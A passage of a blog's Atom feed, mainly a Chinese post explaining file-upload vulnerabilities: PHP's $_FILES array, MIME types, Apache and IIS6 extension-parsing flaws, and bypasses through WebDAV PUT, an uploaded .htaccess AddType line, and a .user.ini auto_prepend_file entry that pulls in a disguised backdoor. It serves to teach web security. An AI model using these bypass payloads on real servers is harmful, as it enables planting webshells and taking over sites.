        &lt;h1 id=&quot;浏览器模型问题&quot;&gt;&lt;a href=&quot;#浏览器模型问题&quot; class=&quot;headerlink&quot; title=&quot;浏览器模型问题&quot;&gt;&lt;/a&gt;浏览器模型问题&lt;/h1&gt;&lt;p&gt;多进程与多线程&lt;/p&gt;
&lt;h3 id=&quot;浏览器的多进程&quot;&gt;&lt;a href=&quot;#浏览器的多进程&quot; cl
      
    
    </summary>
    
    
      <category term="浏览器模型" scheme="http://yoursite.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"/>
    
    
      <category term="web workers" scheme="http://yoursite.com/tags/web-workers/"/>
    
      <category term="JS相关" scheme="http://yoursite.com/tags/JS%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>对文件上传的一些小理解</title>
    <link href="http://yoursite.com/2020/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</id>
    <published>2020-07-17T02:41:32.427Z</published>
    <updated>2020-07-18T07:12:19.734Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP的-FILES数组"><a href="#PHP的-FILES数组" class="headerlink" title="PHP的$_FILES数组"></a>PHP的$_FILES数组</h3><h3 id="如果网页有文件上传的表单，那么在客户端提交之后，就有一个-FILES数组可以直接利用"><a href="#如果网页有文件上传的表单，那么在客户端提交之后，就有一个-FILES数组可以直接利用" class="headerlink" title="如果网页有文件上传的表单，那么在客户端提交之后，就有一个$_FILES数组可以直接利用"></a>如果网页有文件上传的表单，那么在客户端提交之后，就有一个$_FILES数组可以直接利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 $_FILES[&#39;File&#39;][&#39;name&#39;] 客户端文件的原名称。</span><br><span class="line">2 $_FILES[&#39;File&#39;][&#39;type&#39;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;im</span><br><span class="line">age&#x2F;gif&quot;。</span><br><span class="line">3 $_FILES[&#39;File&#39;][&#39;size&#39;] 已上传文件的大小，单位为字节。</span><br><span class="line">4 $_FILES[&#39;File&#39;][&#39;tmp_name&#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默</span><br><span class="line">认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。</span><br></pre></td></tr></table></figure><h2 id="什么是MIME类型？"><a href="#什么是MIME类型？" class="headerlink" title="什么是MIME类型？"></a>什么是MIME类型？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MIME type的全称为Multipurpose Internet Mail Extensions(多用途互联网邮件扩展类型)</span><br><span class="line">是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览</span><br><span class="line">器会自动使用指定应用程序来打开。Response对象通过设置ContentType使客户端浏览器，区分</span><br><span class="line">不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</span><br><span class="line">MIME type类型格式</span><br><span class="line">类别&#x2F;子类别;参数 Content-Type: [type]&#x2F;[subtype]; parameter</span><br><span class="line">MIME type主类别</span><br><span class="line">text：用于标准化地表示的文本信息，人类可读的，可以是多种字符集和或者多种格式；</span><br><span class="line">Multipart：用于连接消息体的多个部分构成一个消息，这些部分可以是不同类型的数据；</span><br><span class="line">Application：用于传输应用程序数据或者二进制数据；</span><br><span class="line">Message：用于包装一个E-mail消息；</span><br><span class="line">Image：用于传输静态图片数据；</span><br><span class="line">Audio：用于传输音频或者音声数据；</span><br><span class="line">Video：用于传输动态影像数据，可以是与音频编辑在一起的视频数据格式。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于text文件类型若没有特定的subtype，就使用 text&#x2F;plain。类似的，二进制文件没有特定或已</span><br><span class="line">知的 subtype，即使用 application&#x2F;octet-stream。</span><br></pre></td></tr></table></figure><h1 id="文件上传校验方式概述"><a href="#文件上传校验方式概述" class="headerlink" title="文件上传校验方式概述"></a>文件上传校验方式概述</h1><p>用HTTP协议传输文件到服务器时，将以POST请求的形式发送到服务器，一般来说会有如下几个步骤</p><p><img src="https://img-blog.csdnimg.cn/20190830165438915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAzNjU4,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="一个特别的攻击方法——PUT方法"><a href="#一个特别的攻击方法——PUT方法" class="headerlink" title="一个特别的攻击方法——PUT方法"></a>一个特别的攻击方法——PUT方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebDAV是一种基于HTTP1.1的通信协议，他在GET,POST,HEAD等HTTP常用方法的基础上扩展</span><br><span class="line">了一些新的方法，使得应用程序可以直接对服务器进行读写操作，当WebDAV开启</span><br><span class="line">PUT,MOVE,DELETE攻击者就可以向服务器上传危险脚本。</span><br></pre></td></tr></table></figure><h1 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h1><h3 id="一、apache解析漏洞"><a href="#一、apache解析漏洞" class="headerlink" title="一、apache解析漏洞"></a>一、apache解析漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache的文件解析的基本流程</span><br></pre></td></tr></table></figure><ol><li>客户端请求文件</li><li>查找mime.type里是否有这种mime类型</li><li>如果有，返回相应的content-type给浏览器，并将文件交给相应的处理器处理<br>如果没有，就不返回content-type给浏览器，直接返回文件内容。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">解析缺陷漏洞</span><br><span class="line">apache解析文件是从右往左开始判断解析的，直到找到一个可以解析的后缀名（apache可以解析的文件后缀名都记录在  Apache&#x2F;conf&#x2F;mine.type  这个文件里面了），</span><br><span class="line">比如说，demo.php.owf.rar，在这个文件名中owf、rar都是apache无法识别的后缀名， apache就会把这个文件解析成PHP文件</span><br><span class="line"></span><br><span class="line"> 一个有趣的问题</span><br><span class="line"></span><br><span class="line">我在调试这个漏洞的时候，发现总是返回500错误，既不正常执行文件，也不返回文件内容，后来才知道了这PHP与apache的交互方式，以及php识别文件的设置有关相关</span><br><span class="line">PHP识别文件</span><br><span class="line">当apache把解析成php文件之后，会把文件交给php处理，但是php会再一次检验文件，这是检验</span><br><span class="line">的正则：&quot;.+\.ph(p[ 345 ]?|t|tml)$&quot; 可以看出PHP只认最后一个后缀名。</span><br><span class="line">apache和PHP交互的方式主要有两种</span><br><span class="line">CGI方式：使用此模式时，当动态请求到达时，httpd会临时启动一个CGI解释器，并用CGI协议转</span><br><span class="line">发要执行的内容，CGI程序运行结束之后会将结果返回给httpd，然后自毁。当面对多个动态请求</span><br><span class="line">时，就要先后启动多个CGI解释器，因此效率极低。不过可以使用FASTCGI让CGI解释器更快的实</span><br><span class="line">现，提升效率</span><br><span class="line">模块方式：将php的模块编译到apache之中，在这种交互模式下，httpd在启动时就会激活、加载</span><br><span class="line">php模块，这就意味着，php会一直在httpd的底层挂载，只要请求到达，就把请求直接转发给内</span><br><span class="line">部的php模块。</span><br><span class="line">没有修改php识别文件的正则匹配时上传demo.php.xxx这种文件，处于CGI（FASTCGI）模式</span><br><span class="line">时PHP解释器就会返回500错误，处于模块模式就会直接返回文件内容</span><br></pre></td></tr></table></figure><h3 id="配和hatccess文件上传（要求使用模块方式）"><a href="#配和hatccess文件上传（要求使用模块方式）" class="headerlink" title="配和hatccess文件上传（要求使用模块方式）"></a>配和hatccess文件上传（要求使用模块方式）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess</span><br><span class="line">文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户</span><br><span class="line">或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，</span><br><span class="line">启用和关闭在httpd.conf文件中配置，在文件解析漏洞中只关心他的一个功能——修改MIME类型</span><br></pre></td></tr></table></figure><p>有些上传没有过滤掉htaccess文件，那么就可以上传一个htaccess文件来使服务器把上传的文件当作php解析。在.htaccess文件中写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 AddType application&#x2F;x‐httpd‐php xxx</span><br></pre></td></tr></table></figure><p>就可以使.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件解析。</p><h3 id="二、IIS6-x解析漏洞（使用这个版本的网站大多比较老，开发语句一般为asp）"><a href="#二、IIS6-x解析漏洞（使用这个版本的网站大多比较老，开发语句一般为asp）" class="headerlink" title="二、IIS6.x解析漏洞（使用这个版本的网站大多比较老，开发语句一般为asp）"></a>二、IIS6.x解析漏洞（使用这个版本的网站大多比较老，开发语句一般为asp）</h3><h3 id="路径解析漏洞"><a href="#路径解析漏洞" class="headerlink" title="路径解析漏洞"></a>路径解析漏洞</h3><p>原理：服务器默认会把.asp，.asa目录下的文件都解析成asp文件例如：demo.asp/shell.jpg   其中的shell.jpg就会被当作asp文件解析</p><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了例如：demo.asp;.jpg    , 会被解析成asp文件</p><h1 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">那么什么是.user.ini？</span><br><span class="line">php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：</span><br><span class="line">PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／</span><br><span class="line">FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用</span><br><span class="line">.htaccess 文件有同样效果， .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和</span><br><span class="line">PHP_INI_USER 模式的 INI 设置可被识别。</span><br><span class="line">总之，user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式</span><br><span class="line">为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置</span><br></pre></td></tr></table></figure><h3 id="在php的配置有两项配置可以利用"><a href="#在php的配置有两项配置可以利用" class="headerlink" title="在php的配置有两项配置可以利用"></a>在php的配置有两项配置可以利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 auto_append_file PHP_INI_PERDIR</span><br><span class="line">2 auto_prepend_file PHP_INI_PERDIR</span><br></pre></td></tr></table></figure><p>这两个配置可以使.user.ini文件影响的范围内每个php文件自动包含一个文件，那么就可以</p><p>通过这个配置直接包含一个后门</p><h3 id="构造-user-ini文件"><a href="#构造-user-ini文件" class="headerlink" title="构造.user.ini文件"></a>构造.user.ini文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 auto_prepend_file&#x3D;shell.gif</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;PHP的-FILES数组&quot;&gt;&lt;a href=&quot;#PHP的-FILES数组&quot; class=&quot;headerlink&quot; title=&quot;PHP的$_FILES数组&quot;&gt;&lt;/a&gt;PHP的$_FILES数组&lt;/h3&gt;&lt;h3 id=&quot;如果网页有文件上传的表单，那么在客户端提交之后
      
    
    </summary>
    
    
      <category term="文件上传漏洞" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="MINE类型" scheme="http://yoursite.com/tags/MINE%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="服务器解析漏洞" scheme="http://yoursite.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
